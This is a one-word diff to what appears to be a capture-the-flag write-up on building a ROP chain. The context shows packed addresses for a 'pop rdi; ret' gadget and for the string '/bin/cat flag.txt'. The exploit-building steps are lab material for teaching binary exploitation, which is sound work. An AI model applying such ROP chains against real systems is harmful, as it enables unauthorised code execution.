@@ -59,7 +59,7 @@ Next, the process should return to the gadget we found before, which will be:
 ```
 '\xc3\x07\x40\x00\x00\x00\x00\x00' //return address jump to the gadget we want. In this case is, pop rdi; ret;
 ```
-Then, we need to put the "/bin/cat flag.txt" address into stack, which will be pop into EDI register later:
+Then, we need to push the "/bin/cat flag.txt" address into stack, which will be pop into EDI register later:
 ```
 '\x60\x10\x60\x00\x00\x00\x00\x00' //the value we want to pop into rdi register. In this case is the address of string "/bin/cat flag.txt".
 ```
